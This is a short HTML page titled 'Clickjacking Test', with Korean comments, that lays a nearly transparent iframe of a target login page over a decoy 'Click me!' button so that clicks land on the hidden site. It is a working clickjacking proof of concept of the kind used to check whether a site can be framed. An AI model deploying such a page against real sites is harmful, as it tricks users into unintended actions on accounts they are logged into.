<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Test</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01; /* iframe을 거의 보이지 않게 설정 */
            z-index: 2;
        }
        button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
        }
    </style>
</head>
<body>
    <h1>Click the Button!</h1>
    <button>Click me!</button>
    <iframe src="https://example.com/login"></iframe> <!-- 타깃 사이트 URL -->
</body>
</html>
